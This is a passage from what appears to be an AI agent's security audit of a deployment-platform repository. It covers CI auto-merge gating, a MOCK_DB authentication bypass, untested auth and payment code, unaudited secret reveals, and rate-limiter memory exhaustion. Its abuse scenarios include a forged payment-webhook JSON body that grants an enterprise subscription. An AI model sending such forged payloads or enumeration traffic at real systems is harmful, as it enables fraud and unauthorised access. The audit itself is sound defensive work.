- **Failure scenario:** Two failures. (1) A PR authored by anyone whose login does not contain the substring 'jules' and is not 'asangzz' — i.e. any new contributor — gets no CI at all: `npm run lint` and `npm test` (159 tests, package.json:15-16) are not invoked by any of the three workflows. A change that breaks every test merges with a green (empty) check surface. (2) Conversely, an account registered as e.g. `julesX` or `notjules99` matches `contains(..., 'jules')` at line 15, so its PRs are auto-approved and queued for auto-merge; the scheduled job at cron-auto-merge.yml:29 then selects PRs where `reviewDecision == "APPROVED"` — the approval this workflow just manufactured — and merges them with `--admin`, explicitly overriding required-review and required-status-check protections on `main`.
- **Impact:** The repository's stated safety posture ('Safety first' comment at cron-auto-merge.yml:27) is not enforced: untested code reaches main, and the review requirement can be satisfied by a bot approval keyed on an attacker-choosable username substring, then force-merged past branch protection. For a platform that builds and runs other people's code with a project-IAM-admin service account, an unreviewed merge is a supply-chain event.
- **Evidence:**

```ts
.github/workflows/auto-merge-jules.yml:15 — the entire job, including the only build check in the repo, is gated on the PR author's login:
    if: github.event.pull_request.user.login == 'jules-google[bot]' || github.event.pull_request.user.login == 'jules[bot]' || contains(github.event.pull_request.user.login, 'jules') || github.event.pull_request.user.login == 'asangzz'

lines 30-35 are the only verification anywhere in CI:
      - name: Install dependencies
        run: npm install
      - name: Run build check
        run: npm run build
        continue-on-error: false

and lines 37-44 auto-approve then auto-merge it:
        run: gh pr review --approve "$PR_URL" || echo "..."
        run: gh pr merge --auto --squash "$PR_URL" || echo "..."

.github/workflows/cron-auto-merge.yml:38 merges with --admin, which bypasses branch protection:
            gh pr merge $pr --squash --admin || 
… (truncated)
```
- **Agent says it ruled out:** Read all three workflow files in .github/workflows end-to-end (auto-merge-jules.yml, cron-auto-merge.yml, sync-lockfile.yml). Grepped all of them for `npm test`, `npm run test`, `npm run lint`, and `eslint` — zero hits. Confirmed all three do declare explicit `permissions:` blocks and none uses `pull_request_target`, so the classic fork-secret-exfiltration pattern is genuinely absent; the defect is the gating logic and the `--admin` merge, not the trigger type. Noted that a fork PR's GITHUB_TOKEN is read-only, which limits (2) to same-repo branches, so it is scored medium rather than high.

### 🟡 MEDIUM — Two divergent lockfiles are committed and only one is kept in sync, so npm and pnpm builds resolve different Next.js versions
- **Location:** `pnpm-lock.yaml:74`
- **Category:** `build-reproducibility`
- **Failure scenario:** Both lockfiles sit at the repo root. The generated build logic picks by file precedence, not by intent — src/lib/dockerfiles.ts:340-343 and templates/Dockerfile.nextjs:13-18 both test `yarn.lock`, then `package-lock.json`, then `pnpm-lock.yaml`, so package-lock always wins and the pnpm lockfile is never exercised. Meanwhile sync-lockfile.yml fires on every package.json change and rewrites only package-lock.json, so pnpm-lock.yaml drifts monotonically and permanently: it is already stale by a full patch release of Next.js and records a specifier (`^16.2.3`) that no longer matches the manifest. Any developer or pipeline that runs `pnpm i --frozen-lockfile` gets ERR_PNPM_OUTDATED_LOCKFILE and a hard build failure; any that runs plain `pnpm i` silently installs Next 16.2.3 — which, per finding #4, is below even more advisory fix lines than 16.2.4.
- **Impact:** Non-reproducible builds and a security-relevant version split: the dependency set you audit with npm is not the dependency set a pnpm-based build installs. The drift is structural, not a one-off, because the automation that maintains lockfiles was only ever taught about npm.
- **Evidence:**

```ts
package.json:42 declares:
    "next": "^16.2.4",

package-lock.json resolves `node_modules/next` to 16.2.4 with root spec `^16.2.4`.

pnpm-lock.yaml:74-76 still records the OLD spec and an older resolution:
      next:
        specifier: ^16.2.3
        version: 16.2.3(@babel/core@7.29.0)(@opentelemetry/api@1.9.0)(...)

.github/workflows/sync-lockfile.yml:12-13 and :43-55 regenerate and commit only the npm lockfile:
    paths:
      - 'package.json'
...
          if git diff --quiet package-lock.json; then
...
          git add package-lock.json
          git commit -m "chore: sync package-lock.json [lockfile-sync]"
```
- **Agent says it ruled out:** Parsed both lockfiles programmatically rather than eyeballing timestamps, confirming the actual resolved versions differ (16.2.4 vs 16.2.3) and that the pnpm importer's recorded specifier no longer matches package.json. Checked whether a packageManager field or engines constraint forces one manager — package.json:5-7 declares only `"node": ">=20.0.0"`, no `packageManager` field, so nothing pins the choice. Confirmed the Dockerfile precedence order in both dockerfiles.ts and templates/Dockerfile.nextjs.

### 🟡 MEDIUM — Six production dependencies are never imported anywhere, and they contribute most of the critical/high advisories in the shipped tree
- **Location:** `package.json:19`
- **Category:** `unused-dependency`
- **Failure scenario:** `npm ci` in the Dockerfile builder stage (Dockerfile:8) installs the full production tree — 595 prod packages — and executes every one of their install lifecycle scripts on the build machine, including puppeteer-core's and @sentry/node's, for code the application never calls. A malicious release or a compromised maintainer account on any of these six packages or their transitive tree executes on the platform's build host with no application-level reachability required, because the compromise happens at install time, not import time. Concretely: `next-auth` carries a critical Auth.js advisory in a project that authenticates with hand-rolled `jose` (src/lib/auth.ts:1) and never imports next-auth, so the risk is pure dead weight.
- **Impact:** Materially inflated install-time attack surface and a permanently red `npm audit` that trains maintainers to ignore it — the critical and several high findings in the production tree come from packages the product does not use, which masks the genuinely reachable ones (next, mysql2, axios, js-yaml). Removing the six shrinks the prod tree and the advisory count without touching a line of application code. Secondary point relevant to crypto hygiene: `crypto-js` and `jsonwebtoken` sit in the manifest alongside `jose`, implying three JWT/crypto stacks where the code actually uses exactly one (jose in src/lib/auth.ts, node:crypto in src/lib/crypto.ts).
- **Evidence:**

```ts
Declared in `dependencies` (package.json:19-56) but with zero import sites across src/ and scripts/:
    "@google-analytics/data": "^5.2.1",
    "cross-fetch": "^4.1.0",
    "crypto-js": "^4.2.0",
    "jsonwebtoken": "^9.0.3",
    "lighthouse": "^13.0.3",
    "next-auth": "^4.24.13",

`npm ls --omit=dev` shows what `lighthouse` alone drags in:
  deployify@0.2.0
  `-- lighthouse@13.0.3
    +-- puppeteer-core@24.40.0
    | `-- ws@8.20.0
    `-- ws@7.5.10

and `npm audit --omit=dev` attributes to these unused roots:
  DIRECT next-auth critical ["Auth.js: OAuth state, nonce, and PKCE check cookies are not bound to the provider that created them", "Auth.js: getToken() throws an uncaught exception on malformed Bearer authorization headers", ...]
  DIRECT lighthouse high ["@sentry/node","puppeteer-core"]
  ws 7.0.0 - 7.5.10 || 8.0.0 - 8.20.1  Severity: high  (uninitialized memory disclosure; me
… (truncated)
```
- **Agent says it ruled out:** Verified non-use two ways rather than assuming: an exact-form grep for `from '<pkg>'`, `require('<pkg>')` and subpath imports across src/ and scripts/, then a broader quoted-string grep for each package name. The only textual hit was the literal string 'lighthouse' in a user-agent bot list at src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:9 — unrelated to the npm package. Confirmed src/lib/performance/lighthouse.ts does NOT import the lighthouse package; it reads `data.lighthouseResult` from the PageSpeed Insights HTTP API. Confirmed pdfkit IS genuinely used (2 import sites) so it is excluded from this finding.

> **Coverage notes (D12):** SWEPT END-TO-END: Dockerfile, templates/Dockerfile.nextjs, next.config.ts, tsconfig.json, eslint.config.mjs, package.json, package-lock.json, pnpm-lock.yaml, .gitignore, all three .github/workflows/*.yml, src/lib/dockerfiles.ts (all 6 generators, 436 lines), src/lib/gcp/cloudbuild.ts (765 lines), src/lib/config.ts, src/lib/crypto.ts (head), src/lib/auth.ts (head), src/proxy.ts (all 214 lines), src/app/api/projects/route.ts (POST validation), src/app/api/projects/[id]/route.ts (PATCH allowlist), src/app/api/projects/[id]/deploy/route.ts, plus every committed root-level script and artifact. Ran `npm audit --omit=dev` and `npm ls` for provenance.

EXPLICITLY CHECKED AND FOUND CLEAN — not reported:
- next.config.ts does NOT set `typescript.ignoreBuildErrors` or `eslint.ignoreDuringBuilds`; tsconfig has `strict: true`. The build genuinely fails on type errors. No finding.
- Both the platform Dockerfile and every generated user Dockerfile DO create and switch to a non-root USER (Dockerfile:26-36; dockerfiles.ts:73/131/188/245/297/362/433). No root-container finding.
- No workflow uses `pull_request_target`; all three declare explicit `permissions:` blocks; no third-party actions are used at all (only first-party actions/checkout@v4 and actions/setup-node@v4). The classic fork-secret-exfil pattern is absent.
- Build-time env var VALUES are correctly shell-escaped before `docker build` (cloudbuild.ts:211 `escapeBashArg`, applied at 289-293 and 316-320). The injection in finding #1 exists specifically because that escaping is not applied to the Dockerfile heredoc — I verified the difference rather than assuming.
- `.env.local` is correctly gitignored (.gitignore:37) and is NOT tracked by git — `git ls-files` confirms. The exposure in finding #3 is the Docker build context only.
- Tested a hypothesis and DISCARDED it: I suspected that because `validateConfig()` only warns (config.ts:104-111) and never throws, a missing JWT_SECRET would let `new TextEncoder().encode(undefined)` (auth.ts:10) produce a guessable HMAC key. Empirically `encode(undefined)` returns a 0-byte array and jose then throws `DataError: Zero-length key is not supported`, so the system fails closed. Not reported.
- Base images are unpinned mutable tags (`node:20-alpine`, `nginx:alpine`, `oven/bun:1-alpine`) with no digest. Real but on its own too thin for medium severity given everything above; folding it into finding #3's remediation is the right call.

COMMITTED JUNK — reviewed, no credentials found, below the severity bar so not filed as findings: `.deployify.json` (contains only `"token": "mock_session_token"` and `http://localhost:3000` — placeholder, not a real credential), `ui.md` (139KB) and `.agent/ui.md`, `plan.md`, `recommendation.md`, `ssl_toggle_full.png` / `ssl_toggle_verification.png`, `scripts/screenshots/*.png`, `scripts/videos/*.webm`, `test_ui.sh`, `verify_ssl_toggle.py`. `tsconfig.tsbuildinfo` (292KB) exists on disk but is correctly gitignored and untracked. One genuine but low-severity defect in this pile: `update_typography.sh:3` and `update_typography_2/3.sh` use `find src -type f -name "*.tsx" -o -name "*.ts" | xargs sed -i` — the `-o` binds looser than the implicit `-a -print`, so the `-type f` guard applies only to the first pattern, and `sed -i` without a backup suffix is GNU-only and fails on the macOS this repo is developed on. These are one-shot codemods that should be deleted, not fixed.

COULD NOT COVER: could not confirm the runtime jq shape of `gh pr list --json statusCheckRollup` (gh is unauthenticated in this environment), so I deliberately omitted a suspected claim that cron-auto-merge.yml:29's `.statusCheckRollup.state == "SUCCESS"` filter never matches because the field is an array — finding #6 rests only on what the workflow files plainly state. Also could not observe the actual Cloud Build service account's IAM policy; finding #1's impact is inferred from the `gcloud projects add-iam-policy-binding` and `gcloud secrets add-iam-policy-binding` calls the build itself issues at cloudbuild.ts:335-342, which the SA must be authorized for. No runtime GCP access, so nothing was validated against a live project.


## D13. Test coverage & observability  <sub>`observability-tests`</sub>

### 🟠 HIGH — CI never runs tests or lint — the only gate is `npm run build`, and the same workflow auto-approves and auto-merges the PR
- **Location:** `.github/workflows/auto-merge-jules.yml:33`
- **Category:** `ci-gap`
- **Failure scenario:** There are exactly three workflow files (`auto-merge-jules.yml`, `cron-auto-merge.yml`, `sync-lockfile.yml`). `rg -n 'npm test|npm run test|npm run lint|eslint|playwright' .github/` returns NOTHING. So the 132 `test()`/`it()` cases in the 34 `*.test.ts` files and the `npm run lint` script are never executed by any automation — they only run when a human types them locally. Concretely: a PR from `asangzz` (the repo owner, per `git config user`) or any author matching `jules` that removes the `if (access.role === 'viewer')` guard at `src/app/api/projects/[id]/env/[envId]/reveal/route.ts:29`, or flips `src/lib/billing/payments.ts:74` `if (!webhookSecret) return false` to `return true`, still type-checks and still builds. The workflow therefore succeeds, runs `gh pr review --approve`, then `gh pr merge --auto --squash`, and the change lands on `main` unreviewed within minutes. `cron-auto-merge.yml:38` compounds this: `gh pr merge $pr --squash --admin` bypasses branch protection every 15 minutes for anything marked APPROVED — and the approval it looks for is the one the bot itself just wrote.
- **Impact:** The entire test suite and linter are decorative. Any security regression in auth, RBAC, crypto, or billing signature verification reaches production `main` with zero human or automated review. Combined with finding #3 (zero tests on those modules), there is no layer at all that would catch it.
- **Evidence:**

```ts
- name: Run build check
        run: npm run build
        continue-on-error: false

      - name: Approve PR
        run: gh pr review --approve "$PR_URL" || echo "..."

      - name: Enable auto-merge
        run: gh pr merge --auto --squash "$PR_URL" || echo "..."

(line 15 gate:)  if: ... || contains(github.event.pull_request.user.login, 'jules') || github.event.pull_request.user.login == 'asangzz'
```
- **Agent says it ruled out:** Enumerated all of `.github/` (3 files, read end-to-end). Grepped for `npm test`, `npm run test`, `npm run lint`, `eslint`, `playwright` across `.github/` — no matches. Checked `package.json` scripts: `test` and `lint` exist and are runnable, they are simply never invoked by CI. Searched for other CI systems (no `.gitlab-ci.yml`, no `cloudbuild.yaml` at repo root, no `.circleci`).

### 🟠 HIGH — `getSession()` returns a hard-coded enterprise-admin session whenever `MOCK_DB=true`, with no `NODE_ENV` guard — a test hook shipped in the production bundle
- **Location:** `src/lib/auth.ts:99`
- **Category:** `test-hook-in-production`
- **Failure scenario:** `MOCK_DB` is a plain runtime env var, not a build-time constant, and the `MOCK_DB === 'true'` branch is NOT conjoined with any `NODE_ENV` check — so it is live in a production `NODE_ENV=production` container. Set `MOCK_DB=true` on the Cloud Run service (a plausible operator action: `src/lib/firebase.ts:17` uses the same flag to serve mock data, so an operator debugging a Firestore outage, or a revision cloned from staging, would set it) and every cookie-less request to any of the 84 API routes returns `MOCK_SESSION` — user `audit-test`, tier `enterprise`. `src/proxy.ts:165` does the same for the dashboard: `if (process.env.NODE_ENV === 'development' || process.env.MOCK_DB === 'true') { return response; }` skips the login redirect entirely. The bypass is also hard-coded into a route handler: `src/app/api/projects/[id]/storage/[storageId]/backups/[backupId]/restore/route.ts:22` reads `if (process.env.MOCK_DB === 'true' && id === 'audit-id')` and skips `checkProjectAccess` altogether. Anonymous internet traffic becomes an authenticated enterprise admin.
- **Impact:** A single env-var misconfiguration converts the whole platform to unauthenticated enterprise-admin access — project listing, env-var reveal, deploys, storage credential rotation, Cloud SQL restore. There is no test asserting the flag is inert under `NODE_ENV=production`, and per finding #1 no test would run anyway. The codebase already knows the correct pattern — `src/app/api/cron/optimize/route.ts:39` writes `if (process.env.NODE_ENV === 'production' || process.env.MOCK_DB !== 'true')` — so this is an inconsistency, not a deliberate design.
- **Evidence:**

```ts
const MOCK_USER: User = {
    id: 'audit-test',
    ...
    subscription: { tier: 'enterprise', ... }
};

export async function getSession(): Promise<Session | null> {
    const cookieStore = await cookies();
    const token = decodeURIComponent(cookieStore.get(COOKIE_NAME)?.value || '');
    ...
    if (!token) {
        // Fallback for local development if no session exists
        if (process.env.NODE_ENV === 'development' || process.env.MOCK_DB === 'true') {
            return MOCK_SESSION;
        }
        return null;
    }
```
- **Agent says it ruled out:** Grepped every `MOCK_DB` occurrence in `src/` (50+ hits). Confirmed `src/lib/auth.ts:99` and `src/proxy.ts:165` use `NODE_ENV === 'development' || MOCK_DB === 'true'` (OR, so MOCK_DB alone suffices in production), unlike `src/app/api/cron/optimize/route.ts:39` which correctly hard-gates on production. Confirmed `next.config.ts` does not inline or strip `MOCK_DB`. Confirmed `env.example` never mentions `MOCK_DB`, so there is no documented warning. Grepped for any startup assertion rejecting `MOCK_DB` in production — none; `validateConfig()` (src/lib/config.ts:88) only `console.warn`s and does not check this flag.

### 🟠 HIGH — Zero test coverage on every security-critical module: auth, RBAC, crypto, security helpers, edge proxy, and both payment-signature verifiers
- **Location:** `src/lib/billing/payments.ts:82`
- **Category:** `test-coverage`
- **Failure scenario:** Inventory: 84 `route.ts` handlers under `src/app/api/**`; exactly ONE has a co-located test (`src/app/api/projects/[id]/storage/[storageId]/query/route.test.ts`) — 1/84. 39 of 62 non-test files under `src/lib` have no sibling test. `rg -ln 'lib/auth|middleware/rbac|lib/crypto|lib/security|@/proxy|billing/payments' --glob 'src/**/*.test.ts'` returns only the three `*-branching.test.ts` files, and those import `@/lib/db` solely to exercise `getEnvVarsForDeployment` under `MOCK_DB=true` — they do not test auth, RBAC, or crypto. So `src/lib/auth.ts` (JWT mint/verify, session cookie), `src/middleware/rbac.ts` (the single `checkProjectAccess` used by ~40 routes), `src/lib/crypto.ts` (AES-256-GCM secret encryption), `src/lib/security/index.ts` (GitHub webhook HMAC, rate limiter, env-key validation), `src/proxy.ts` (the edge auth/rate-limit layer), and `src/lib/billing/payments.ts` all have literally zero assertions. The quoted line is the concrete cost: `verifyWebhookSignature` compares with `===` (non-constant-time) while the sibling `verifyGitHubWebhookSignature` at `src/lib/security/index.ts:69` correctly uses `crypto.timingSafeEqual` — a live inconsistency in the money path that no test flags. And nothing asserts the fail-closed `if (!webhookSecret) return false`; changing it to `return true` (the exact 'make local dev work without keys' pattern this repo already uses in `auth.ts:99` and `firebase.ts:17`) would let anyone POST `{"event":"payment.captured","payload":{"payment":{"entity":{"notes":{"userId":"<victim>","tierId":"enterprise"}}}}}` to `/api/billing/webhook` and self-provision an enterprise subscription.
- **Impact:** The blast-radius modules — session issuance, the sole authorization primitive, secret encryption, and both payment verifiers — are the least tested code in the repo, inverting the risk/coverage relationship. Combined with finding #1 (CI runs no tests), a regression in any of them has no detection mechanism before production.
- **Evidence:**

```ts
export function verifyWebhookSignature(
    body: string,
    signature: string,
    webhookSecret: string | undefined
): boolean {
    if (!webhookSecret) {
        console.error('[Razorpay Webhook] Cannot verify signature: webhookSecret is missing');
        return false;
    }
    const hmac = crypto.createHmac('sha256', webhookSecret);
    hmac.update(body);
    const generatedSignature = hmac.digest('hex');
    return generatedSignature === signature;
}
```
- **Agent says it ruled out:** Ran the full test inventory (`find src -name '*.test.ts'`, 34 files) and extracted every import across them — the only production modules imported are gcp/*, github/*, performance/lighthouse, billing/invoices, analytics, dockerfiles, utils, masking, and `@/lib/db` (3 branching tests). Confirmed no `__tests__` directories and no test files outside `src/` (the `.claude/worktrees/` hits are a git worktree copy of the same files, and `npm test`'s `find src ...` does not reach them). Confirmed `src/lib/billing/invoices.test.ts` exists but covers invoice formatting only, not `payments.ts`.

### 🟠 HIGH — Revealing a decrypted secret writes no audit record, while every other env-var mutation does
- **Location:** `src/app/api/projects/[id]/env/[envId]/reveal/route.ts:53`
- **Category:** `audit-gap`
- **Failure scenario:** The file imports no audit module and calls `logAuditEvent` nowhere — the plaintext secret is returned and the request leaves no trace. By contrast, `src/app/api/projects/[id]/env/route.ts` audits all three mutations (`logAuditEvent` at lines 140, 259, 327), so add/update/delete of a secret is recorded but *reading* it is not. Concretely: a team member with role `developer` (the viewer check at line 29 stops only `viewer`) enumerates the project's env var ids from `GET /api/projects/<id>/env` and then issues `GET /api/projects/<id>/env/<envId>/reveal` for each one, collecting the decrypted DATABASE_URL, Razorpay/Stripe keys, and any GitHub token. `GET /api/teams/<id>/audit` (backed by `listAuditLogs`) shows nothing for these reads. The proxy rate limiter is keyed `${ip}:${pathname}` (src/proxy.ts:124) and each envId is a distinct pathname, so the 100/min budget is per-secret, not per-attacker — enumeration is effectively unthrottled.
- **Impact:** Credential exfiltration by an insider or a stolen session cookie is invisible. During incident response there is no way to answer 'which secrets were read, by whom, and when', so the only safe remediation is rotating every secret in every project. This is the single highest-value read in the product and it is the one action with no audit trail.
- **Evidence:**

```ts
import { getSession } from '@/lib/auth';
import { checkProjectAccess } from '@/middleware/rbac';
import { decrypt } from '@/lib/crypto';
import { securityHeaders } from '@/lib/security';
...
        let value = envVar.value;
        if (envVar.isEncrypted) {
            try {
                value = decrypt(value);
            } catch (e) { ... }
        }

        return NextResponse.json({ value }, { headers: securityHeaders });
```
- **Agent says it ruled out:** Grepped every `logAuditEvent` call site in `src/` (30 call sites across 20 route files) — the reveal route is not among them. Confirmed `src/lib/audit.ts` is the only audit sink and `Collections.AUDIT_LOGS` is written nowhere else. Confirmed `trackError` is not called here either (only 2 call sites repo-wide: `src/proxy.ts` and the public proxy route). Confirmed the route is not covered by a broader logging wrapper — there is no `instrumentation.ts` and `src/proxy.ts` logs nothing on the success path.

### 🟠 HIGH — Cloud SQL backup restore is neither audit-logged nor role-gated, and carries a `MOCK_DB` authorization bypass
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/backups/[backupId]/restore/route.ts:22`
- **Category:** `audit-gap`
- **Failure scenario:** Two defects in one destructive handler. (a) `access.role` is never inspected — `rg -c 'access\.role' src/app/api` confirms this file has zero occurrences, while the sibling credential-rotation route `src/app/api/projects/[id]/storage/[storageId]/rotate/route.ts:29` correctly does `if (access.role === 'viewer') return 403`. So a user invited as `viewer` can POST to this endpoint and issue a Cloud SQL `restoreBackup`, which overwrites the live production database with an older snapshot — irreversible data loss for every write since that backup. (b) The handler then returns `{success:true}` and calls `logAuditEvent` nowhere (the file imports no audit module), so the destruction leaves no record of who triggered it. (c) The `MOCK_DB && id === 'audit-id'` branch skips `checkProjectAccess` entirely, so with finding #2's flag set, an unauthenticated caller reaches `restoreBackup` for project id `audit-id`.
- **Impact:** A read-only collaborator can destroy a team's production database, and the audit log the team would consult afterwards is empty for that action. Backup restore is explicitly one of the security-relevant actions that must be recorded; it is the only destructive storage operation in the tree that is both unaudited and unauthorized.
- **Evidence:**

```ts
if (process.env.MOCK_DB === 'true' && id === 'audit-id') {
            storageConfig = { id: 'mock-storage-id', ... } as StorageConfig;
        } else {
            const access = await checkProjectAccess(session.user.id, id);
            if (!access.allowed) return NextResponse.json({ success: false, error: access.error }, { status: access.status });
            storageConfig = access.project?.storageConfigs?.find((s: StorageConfig) => s.id === storageId);
        }
...
        const operationName = backupId === 'pitr'
            ? await restoreBackup(instanceName, undefined, pointInTime)
            : await restoreBackup(instanceName, backupId);

        return NextResponse.json({ success: true, operationName });
```
- **Agent says it ruled out:** Read the route end-to-end (62 lines) — no `logAuditEvent`, no `access.role` check. Compared against every other storage sub-route: `rotate`, `clone`, `import`, `export`, `cutover`, `ingest`, `apply-index`, `replica`, `replica/promote` all appear in `rg -c 'access\.role'` output; `backups/[backupId]/restore` does not. Confirmed `logAuditEvent` is called by `rotate/route.ts:88`, `clone/route.ts:120`, `import/route.ts:83`, `export/route.ts:78`, `replica/promote/route.ts:64` — but not by the restore route. Confirmed `src/proxy.ts` applies no per-role or per-method gating that would compensate.

### 🟡 MEDIUM — The edge proxy's in-memory rate-limit Map has no eviction at all, keyed by attacker-controlled pathname
- **Location:** `src/proxy.ts:21`
- **Category:** `resource-leak`
- **Failure scenario:** Expired records are overwritten only if the *same* key is seen again; they are never deleted. The key is `${ip}:${pathname}` and `pathname` is fully attacker-controlled — `src/proxy.ts`'s matcher is `'/((?!favicon.ico|public/).*)'`, so the rate-limit block runs for any request whose path starts with `/api/`, including paths with no matching route. A single client issuing `GET /api/x/1`, `/api/x/2`, ... `/api/x/N` inserts N permanent Map entries (each ~60–80 bytes of key plus a heap object), all of which return 404 from Next's router and none of which are ever reclaimed. A few million such requests — trivially cheap to send, and each individually within the 100/min budget because every key is fresh — grows the Map into the hundreds of megabytes until the Cloud Run container OOMs and is killed mid-request. The identical helper in `src/lib/security/index.ts:42` has `cleanupExpiredEntries()` invoked probabilistically (`if (Math.random() < 0.01)`) at line 20; `src/proxy.ts` was copied from it without that function, so this is an omission rather than a design choice.
- **Impact:** Unauthenticated memory-exhaustion of the platform's own Cloud Run service, causing rolling container restarts that drop in-flight deploys and, because the rate-limit state lives only in that memory, reset every client's rate-limit counters on each restart. No metric or alert exists for Map size (see finding #8).
- **Evidence:**

```ts
// In-memory rate limit store (Edge-compatible)
const rateLimitStore = new Map<string, { count: number; resetAt: number }>();

function checkRateLimit(identifier: string, limit: number = 100, windowMs: number = 60000) {
    const now = Date.now();
    const record = rateLimitStore.get(identifier);
    if (!record || now > record.resetAt) {
        const resetAt = now + windowMs;
        rateLimitStore.set(identifier, { count: 1, resetAt });
        return { allowed: true, remaining: limit - 1, resetAt };
    }
    ...
}
...
            const rateLimitResult = checkRateLimit(`${ip}:${pathname}`, limit);
```
- **Agent says it ruled out:** Read `src/proxy.ts` end-to-end (214 lines) — there is no cleanup function, no `.delete()` call, no size cap, and no TTL anywhere in the file. Grepped for a Redis-backed limiter (`ioredis` is a dependency but is used only for user-owned storage connectors in `src/lib/redis-branching.ts`, not for platform rate limiting). Confirmed `src/lib/security/index.ts` has the eviction that `src/proxy.ts` lacks, so this is not intentional. Confirmed no external WAF layer is configured for the platform host (`src/lib/gcp/armor.ts` provisions Cloud Armor for user projects, not for Deployify itself).

### 🟡 MEDIUM — Public proxy failures write an unbounded, awaited Firestore document per request on a path that bypasses the rate limiter
- **Location:** `src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:217`
- **Category:** `observability-dos`
- **Failure scenario:** Requests to a project subdomain never reach the rate limiter. In `src/proxy.ts`, the subdomain branch returns at line 109 — `return NextResponse.rewrite(url, { headers: responseHeaders });` — while the rate-limit block does not begin until line 115 (`if (pathname.startsWith('/api/'))`). The rewrite is internal, so the rewritten `/api/v1/proxy/<slug>/...` request is not re-evaluated by the proxy. Now pick any deployed project whose backing Cloud Run service is scaled to zero, erroring, or whose `productionUrl` is stale: `await fetch(targetUrl, ...)` at line 164 throws, and every single request then `await`s a `db.collection('errors').doc(id).set(event)` write carrying a full stack trace (`src/lib/logging/tracker.ts:51`) before the 502 is returned. There is no sampling, no dedup, no per-project cap, no TTL policy on the collection, and the write is on the critical path so it also inflates 502 latency. An anonymous attacker sending a few hundred requests per second at `https://<slug>.deployify.io/` drives that many writes per second into the platform's shared Firestore. The 502 body additionally echoes `targetUrl`, disclosing the project's internal `*.run.app` origin to the anonymous caller.
- **Impact:** Anonymous, unmetered write amplification into the platform's shared Firestore: billing blowup plus contention against the same database that serves sessions, projects, and audit logs for every tenant. Because the write is awaited, a slow Firestore also serializes the error path and holds Cloud Run request slots open.
- **Evidence:**

```ts
} catch (error: unknown) {
        const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred during proxying';

        // Log to central error tracker
        await trackError({
            message: `Internal Proxy Error: ${errorMessage}`,
            projectId: project?.id,
            error,
            path: fullPath,
            method: req.method,
            metadata: { slug, targetUrl }
        });

        console.error(`Internal Proxy Error (${req.method}):`, error);
        return NextResponse.json({ error: 'Internal Proxy Error', message: errorMessage, targetUrl }, { status: 502 });
```
- **Agent says it ruled out:** Traced the request path in `src/proxy.ts` line by line and confirmed the subdomain `return` at line 109 precedes the `/api/` rate-limit block at line 115. Confirmed `checkRateLimit` is not called anywhere inside the proxy route handler itself. Grepped `Collections.ERRORS` — one write, no reads, no retention job; grepped `firestore.indexes.json` for a TTL policy on `errors` — none. Confirmed `trackError` has its own try/catch so it cannot itself throw and short-circuit the loop. Confirmed `logEdgeEvent` (line 180) is fire-and-forget, so the awaited write in the catch block is the blocking one.

### 🟡 MEDIUM — No error-reporting or APM integration anywhere, and the one 'central error tracker' is write-only — nothing ever reads the `errors` collection
- **Location:** `src/lib/logging/tracker.ts:51`
- **Category:** `observability-gap`
- **Failure scenario:** `rg -n 'Collections.ERRORS'` across `src/` returns exactly one hit — this write at line 51. There is no read, no query, no API route, and no component that surfaces the `errors` collection (`rg -n 'ErrorEvent'` matches only the interface declaration and its use inside this same file). So every error that does get tracked is buried in Firestore where no human or alert ever sees it. And almost nothing is tracked: `trackError` has only two call sites repo-wide (`src/proxy.ts:183` and the public proxy route's catch), so 82 of 84 API route handlers report failures solely via `console.error` — 729 `console.*` calls across `src/`, none structured. There is no `@google-cloud/error-reporting`, no Sentry, no OpenTelemetry, and no Datadog in `package.json` (`rg -il 'sentry|@google-cloud/error|opentelemetry|datadog|newrelic' src package.json` returns nothing), and no `src/instrumentation.ts` to register one. No request id or trace field is attached to any log line or to `AuditEvent`/`ErrorEvent`, so the log lines emitted while handling one request cannot be correlated in Cloud Logging. Concretely: rotate `ENCRYPTION_KEY` without re-encrypting stored values and every deploy begins failing at `src/lib/db.ts:241` (`throw new Error('Failed to decrypt secret ...')`) and every secret reveal 500s at `reveal/route.ts:49`. Nothing aggregates, dedups, counts, or alerts on this — the failure is discovered only when a customer opens a support ticket.
- **Impact:** No mean-time-to-detection for any production failure: failed deploys, failed Razorpay webhook processing, decrypt failures, and Firestore outages all degrade silently. Post-incident forensics is limited to grepping raw Cloud Run text logs with no request correlation, and the Firestore `errors` collection accumulates cost while providing zero operational value.
- **Evidence:**

```ts
// Also log to console for development/system logs
        console.error(`[Error Tracker] ${event.id}: ${event.message}`, {
            path: event.path,
            method: event.method,
            projectId: event.projectId
        });

        await db.collection(Collections.ERRORS).doc(id).set(event);
        return id;
    } catch (e) {
        // Fallback to console if Firestore fails
        console.error('Failed to log error to tracker:', e);
        return 'failed-to-log';
    }
```
- **Agent says it ruled out:** Grepped `package.json` and all of `src/` for every common error-reporting/APM SDK — zero hits. Confirmed no `src/instrumentation.ts` and no `register()` hook (only `src/app/global-error.tsx` exists, which is a client-side React boundary and does not report anywhere). Grepped for `Collections.ERRORS` reads and for any `/api/**/errors` route — none exist. Grepped `logAuditEvent` and `trackError` signatures in `src/lib/audit.ts` and `src/lib/logging/tracker.ts` for a correlation/trace/request-id field — `AuditEvent` has only `{id, teamId, userId, action, details, createdAt}` and `ErrorEvent` only `{id, projectId, message, stack, path, method, timestamp, metadata}`. Confirmed `src/lib/gcp/monitoring.ts` and `src/lib/gcp/logging.ts` read Cloud Monitoring/Logging for *user* projects, not for the Deployify platform service itself.

> **Coverage notes (D13):** SWEPT — Test inventory: 34 `*.test.ts` files (132 `test()`/`it()` cases), all under `src/`; no `__tests__` dirs, no test files outside `src/` (the `.claude/worktrees/hopeful-ramanujan-1c5e5b/` hits are a git worktree duplicate that `npm test`'s `find src ...` does not reach). Quantified coverage: 1 of 84 API `route.ts` handlers has a co-located test (`src/app/api/projects/[id]/storage/[storageId]/query/route.test.ts`); 39 of 62 non-test files under `src/lib` have no sibling test. Verified by import-extraction across all 34 test files that ZERO tests touch `src/lib/auth.ts`, `src/middleware/rbac.ts`, `src/lib/crypto.ts`, `src/lib/security/index.ts`, `src/proxy.ts`, `src/lib/billing/payments.ts`, the billing webhook/verify routes, or the public proxy route (the three `*-branching.test.ts` files import `@/lib/db` only to exercise `getEnvVarsForDeployment` under `MOCK_DB=true`).

